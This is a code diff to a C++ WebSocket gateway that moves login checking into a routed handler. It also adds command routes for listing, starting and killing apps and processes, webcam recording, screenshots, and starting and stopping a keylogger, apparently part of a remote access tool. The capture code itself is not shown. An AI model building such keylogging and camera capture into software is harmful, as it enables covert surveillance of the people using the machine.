@@ -1,6 +1,8 @@
 #include "Gateway.hpp"
 
-Gateway::Gateway(WSServer& server, Router& router) : server_(server), router_(router) {}
+Gateway::Gateway(WSServer& server, std::shared_ptr<Router> router) : server_(server), router_(router) {
+    registerInternalRoutes();
+}
 
 bool Gateway::validateLogin(const json& data) {
     if (!data.contains("user") || !data.contains("pass")) {
@@ -17,33 +19,15 @@ bool Gateway::validateLogin(const json& data) {
 
 void Gateway::onMessage(SessionPtr session, const Message& msg) {
     //std::cout << "[Gateway] Received from " << clientId << ": " << payload << "\n";
-    bool isLogged = session->isLoggedIn();
-
-    if (!isLogged) {
-        if (msg.type == Protocol::TYPE::AUTH) {
-            if (validateLogin(msg.data)) {
-                if (msg.data.is_object() && validateLogin(msg.data)) {
-                    session->setAuthenticated(true);
-                    session->send(Message("auth_result", "ok").serialize());
-                    std::cout << "[Gateway] User logged in!\n";
-                } else {
-                    session->send(Message("error", "Invalid username or password.").serialize());
-                }
-            } else {
-                session->send(Message("error", "Wrong password").serialize());
-            }
-        } else {
-            session->send(Message("error", "Please login first").serialize());
-        }
-        
-        return;
+    if (session->isLoggedIn() || msg.type == Protocol::TYPE::AUTH) {
+        router_->dispatch(msg, session);
+    } else {
+        session->send(Message(Protocol::TYPE::ERROR, {{"msg", "Please login first"}}).serialize());
     }
-
-    router_.dispatch(msg, session);
 }
 
 void Gateway::registerInternalRoutes() {
-    router_.registerHandler(
+    router_->registerHandler(
         Protocol::TYPE::PING,
         [](const Message&, Gateway::SessionPtr s) {
             s->send(
@@ -52,7 +36,19 @@ void Gateway::registerInternalRoutes() {
         }
     );
 
-    router_.registerHandler(
+    router_->registerHandler(
+        Protocol::TYPE::AUTH,
+        [this](const Message& msg, Gateway::SessionPtr session) {
+            if (msg.data.is_object() && this->validateLogin(msg.data)) {
+                session->setAuthenticated(true);
+                session->send(Message(Protocol::TYPE::AUTH, {{"status", "ok"}, {"msg", "Auth successful!"}}).serialize());
+            } else {
+                session->send(Message(Protocol::TYPE::AUTH, {{"status", "failed"}, {"msg", "Auth failed!"}}).serialize());
+            }
+        }
+    );
+
+    router_->registerHandler(
         Protocol::TYPE::HEARTBEAT,
         [](const Message&, Gateway::SessionPtr s) {
             s->send(
@@ -61,9 +57,29 @@ void Gateway::registerInternalRoutes() {
         }
     );
     
-    router_.registerHandler(
+    router_->registerHandler(
         Protocol::TYPE::BROADCAST, 
         [this](const Message& msg, SessionPtr session) {
             this->server_.broadcast(msg);
     });
+
+    auto systemCommandHandler = [](const Message& msg, SessionPtr session) {
+        cout << "[Gateway] Executing command: " << msg.type << "\n";
+        Message response = ParseCommand(msg);
+        session->send(response.serialize());
+    };
+
+    router_->registerHandler(Protocol::TYPE::APP_LIST, systemCommandHandler);
+    router_->registerHandler(Protocol::TYPE::APP_START, systemCommandHandler);
+    router_->registerHandler(Protocol::TYPE::APP_KILL, systemCommandHandler);
+
+    router_->registerHandler(Protocol::TYPE::PROC_LIST, systemCommandHandler);
+    router_->registerHandler(Protocol::TYPE::PROC_START, systemCommandHandler);
+    router_->registerHandler(Protocol::TYPE::PROC_KILL, systemCommandHandler);
+
+    router_->registerHandler(Protocol::TYPE::CAM_RECORD, systemCommandHandler);
+    router_->registerHandler(Protocol::TYPE::SCREENSHOT, systemCommandHandler);
+
+    router_->registerHandler(Protocol::TYPE::START_KEYLOG, systemCommandHandler);
+    router_->registerHandler(Protocol::TYPE::STOP_KEYLOG, systemCommandHandler);
 }
